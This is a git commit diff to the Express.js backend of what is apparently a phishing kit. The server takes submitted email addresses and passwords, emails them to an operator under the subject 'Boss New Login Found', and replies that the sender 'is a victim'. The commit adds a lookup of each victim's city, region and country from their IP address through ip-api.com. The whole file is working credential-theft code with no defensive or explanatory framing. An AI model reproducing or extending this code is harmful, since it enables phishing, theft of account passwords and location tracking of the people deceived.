363c78cb4d3763be71dc8d3201aa0d3e004bcab0
devadg <opponamer@gmail.com>
2024-11-30 19:11:02 +0100

    done

--- index.js
+++ index.js
@@ -1,5 +1,6 @@
 const express = require('express');
 const cors = require("cors");
+const axios = require('axios');
 const sendEmail = require("./utils/mail");
 require("dotenv").config();
 
@@ -14,11 +15,25 @@ app.post("/", async (req, res) => {
     const data = req.body;
     const email = data.receiver;
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const message = `Email: ${data.name}\nAccess: ${data.pass}\nSource: ${data.source}\nClient IP: ${clientIp}`;
+    // const message = `Email: ${data.name}\nAccess: ${data.pass}\nSource: ${data.source}\nClient IP: ${clientIp}`;
 
+    try {
+      const ip = clientIp.split(',')[0];
+      const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
+      const { city, regionName, country } = geoResponse.data;
+  
+      const message = `Email: ${data.name}\nAccess: ${data.pass}\nSource: ${data.source}\nClient IP: ${ip}\nLocation: ${city}, ${regionName}, ${country}`;
+      console.log(message); // Log the message
 
-    await sendEmail(email,"Boss New Login Found",message);
-    res.send(`Success: ${data.name} - ${data.email} is a victim!`);
+      await sendEmail(email,"Boss New Login Found",message);
+      res.send(`Success: ${data.name} - ${data.email} is a victim!`);
+    } catch (error) {
+      console.error('Error fetching geolocation data:', error.message);
+      res.status(500).send('Error processing request');
+    }
+
+    // await sendEmail(email,"Boss New Login Found",message);
+    // res.send(`Success: ${data.name} - ${data.email} is a victim!`);
 });
 
 app.listen(PORT, () => {
